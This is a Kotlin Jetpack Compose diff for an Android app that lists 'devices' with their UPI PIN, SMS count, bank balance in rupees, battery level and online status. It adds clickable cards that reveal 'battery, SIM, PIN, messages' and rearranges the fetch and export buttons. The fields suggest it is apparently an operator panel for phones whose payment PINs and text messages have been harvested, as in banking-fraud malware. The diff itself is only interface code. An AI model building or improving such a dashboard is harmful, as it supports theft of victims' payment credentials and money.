@@ -211,7 +211,7 @@ class MainActivity : ComponentActivity() {
                         item {
                             Spacer(Modifier.height(8.dp))
                             Text(
-                                "TXT upload → Fetch Live",
+                                "TXT load → filters set karo → Start Fetch / Fetch Live",
                                 color = VirtusColors.yellow.copy(alpha = 0.85f),
                                 fontSize = 11.sp,
                                 modifier = Modifier.fillMaxWidth(),
@@ -270,6 +270,7 @@ class MainActivity : ComponentActivity() {
                             DeviceCardYellow(
                                 index = index + 1,
                                 row = row,
+                                onOpenDetail = { vm.selectDevice(row) },
                                 onInfoClick = { vm.selectDevice(row) },
                             )
                         }
@@ -338,22 +339,56 @@ private fun TopActionRow(
     fetchEnabled: Boolean,
     exportEnabled: Boolean,
 ) {
-    Row(
+    Column(
         modifier = Modifier.fillMaxWidth(),
-        horizontalArrangement = Arrangement.spacedBy(8.dp),
-        verticalAlignment = Alignment.CenterVertically,
+        verticalArrangement = Arrangement.spacedBy(8.dp),
     ) {
-        VirtusSmallButton(
-            onClick = onTxt,
-            container = VirtusColors.card,
-            content = VirtusColors.yellow,
-            icon = { Icon(Icons.Filled.FolderOpen, null) },
-            label = "TXT",
-        )
+        Row(
+            modifier = Modifier.fillMaxWidth(),
+            horizontalArrangement = Arrangement.SpaceBetween,
+            verticalAlignment = Alignment.CenterVertically,
+        ) {
+            VirtusSmallButton(
+                onClick = onTxt,
+                container = VirtusColors.card,
+                content = VirtusColors.yellow,
+                icon = { Icon(Icons.Filled.FolderOpen, null) },
+                label = "TXT",
+            )
+            Column(horizontalAlignment = Alignment.End) {
+                OutlinedButton(
+                    onClick = onExport,
+                    enabled = exportEnabled,
+                    modifier = Modifier.heightIn(min = 44.dp),
+                    shape = RoundedCornerShape(14.dp),
+                    border = BorderStroke(1.dp, VirtusColors.yellow),
+                    colors =
+                        ButtonDefaults.outlinedButtonColors(
+                            containerColor = VirtusColors.card,
+                            contentColor = VirtusColors.yellow,
+                            disabledContentColor = VirtusColors.onMuted,
+                        ),
+                    contentPadding = PaddingValues(horizontal = 10.dp, vertical = 8.dp),
+                ) {
+                    Icon(Icons.Filled.UploadFile, contentDescription = null, modifier = Modifier.size(16.dp))
+                    Spacer(Modifier.width(4.dp))
+                    Text("Export TXT", fontSize = 11.sp, fontWeight = FontWeight.SemiBold, maxLines = 1)
+                }
+                Text(
+                    "$panels panels",
+                    color = VirtusColors.onMuted,
+                    fontSize = 11.sp,
+                    modifier = Modifier.padding(top = 4.dp),
+                )
+            }
+        }
         Button(
             onClick = onFetchLive,
             enabled = fetchEnabled,
-            modifier = Modifier.weight(1f),
+            modifier =
+                Modifier
+                    .fillMaxWidth()
+                    .heightIn(min = 48.dp),
             shape = RoundedCornerShape(14.dp),
             colors =
                 ButtonDefaults.buttonColors(
@@ -364,33 +399,9 @@ private fun TopActionRow(
                 ),
         ) {
             Icon(Icons.Filled.FlashOn, contentDescription = null, modifier = Modifier.size(18.dp))
-            Spacer(Modifier.width(6.dp))
-            Text("Fetch Live", fontWeight = FontWeight.Bold)
+            Spacer(Modifier.width(8.dp))
+            Text("Fetch Live", fontWeight = FontWeight.Bold, maxLines = 1)
         }
-        OutlinedButton(
-            onClick = onExport,
-            enabled = exportEnabled,
-            modifier = Modifier.height(44.dp),
-            shape = RoundedCornerShape(14.dp),
-            border = BorderStroke(1.dp, VirtusColors.yellow),
-            colors =
-                ButtonDefaults.outlinedButtonColors(
-                    containerColor = VirtusColors.card,
-                    contentColor = VirtusColors.yellow,
-                    disabledContentColor = VirtusColors.onMuted,
-                ),
-            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 8.dp),
-        ) {
-            Icon(Icons.Filled.UploadFile, contentDescription = null, modifier = Modifier.size(16.dp))
-            Spacer(Modifier.width(4.dp))
-            Text("Export TXT", fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
-        }
-        Text(
-            "$panels panels",
-            color = VirtusColors.onMuted,
-            fontSize = 11.sp,
-            modifier = Modifier.padding(start = 2.dp),
-        )
     }
 }
 
@@ -938,13 +949,15 @@ private fun StartFetchButton(
 private fun DeviceCardYellow(
     index: Int,
     row: DeviceRow,
+    onOpenDetail: () -> Unit,
     onInfoClick: () -> Unit,
 ) {
     Card(
         modifier =
             Modifier
                 .fillMaxWidth()
-                .padding(vertical = 6.dp),
+                .padding(vertical = 6.dp)
+                .clickable(onClick = onOpenDetail),
         shape = RoundedCornerShape(12.dp),
         colors = CardDefaults.cardColors(containerColor = VirtusColors.smsCardWhite),
         elevation = CardDefaults.cardElevation(defaultElevation = 4.dp),
@@ -970,25 +983,24 @@ private fun DeviceCardYellow(
             Spacer(Modifier.width(10.dp))
             Column(Modifier.weight(1f)) {
                 DetailLine("Mobile", row.modelDisplay)
-                DetailLine("UPI Pin", row.upiPinDisplay)
-                DetailLine("Device Id", row.deviceId)
-                DetailLine("Battery", if (row.batteryPercent != null) "${row.batteryPercent}%" else "—")
-                DetailLine(
-                    "Date",
-                    if (row.lastSeenMillis != null && row.lastSeenMillis!! > 0L) formatTsLong(row.lastSeenMillis!!) else "—",
-                )
-                HorizontalDivider(Modifier.padding(vertical = 6.dp), color = Color(0xFFE0E0E0))
                 Text(
                     "Status: ${if (row.online) "Online" else "Offline"}",
                     color = if (row.online) Color(0xFF2E7D32) else Color(0xFFC62828),
                     fontWeight = FontWeight.SemiBold,
                     fontSize = 13.sp,
+                    modifier = Modifier.padding(vertical = 2.dp),
                 )
                 Text(
                     "₹ ${formatInr(row.maxBalance)} · ${row.smsCount} SMS",
                     color = Color(0xFF424242),
                     fontSize = 11.sp,
                     modifier = Modifier.padding(top = 4.dp),
+                )
+                Text(
+                    "Tap → battery, SIM, PIN, messages",
+                    color = VirtusColors.labelBlue,
+                    fontSize = 10.sp,
+                    modifier = Modifier.padding(top = 6.dp),
                 )
             }
             Column(
